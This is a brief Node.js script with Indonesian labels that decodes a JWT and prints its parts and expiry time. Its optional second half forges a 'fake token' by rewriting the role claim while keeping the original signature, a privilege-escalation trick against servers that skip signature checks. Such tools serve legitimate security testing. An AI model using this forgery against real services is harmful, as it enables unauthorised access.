const [token, roleBaru] = process.argv.slice(2);

if (!token || token.split('.').length !== 3) {
  console.log('Cara pakai: node bedah-token.js <token> [role-baru]');
  process.exit(1);
}

const [header, payload, ttd] = token.split('.');

function baca(teks) {
  return JSON.parse(Buffer.from(teks, 'base64url').toString('utf8'));
}

const isi = baca(payload);

console.log('Header       :', JSON.stringify(baca(header)));
console.log('Payload      :', JSON.stringify(isi));
console.log('Tanda tangan :', ttd);
console.log('Berlaku sampai:', new Date(isi.exp * 1000).toLocaleString('id-ID'));

if (roleBaru) {
  isi.role = roleBaru;
  const payloadPalsu = Buffer.from(JSON.stringify(isi)).toString('base64url');
  console.log('');
  console.log(`Token palsu dengan role ${roleBaru}:`);
  console.log(`${header}.${payloadPalsu}.${ttd}`);
}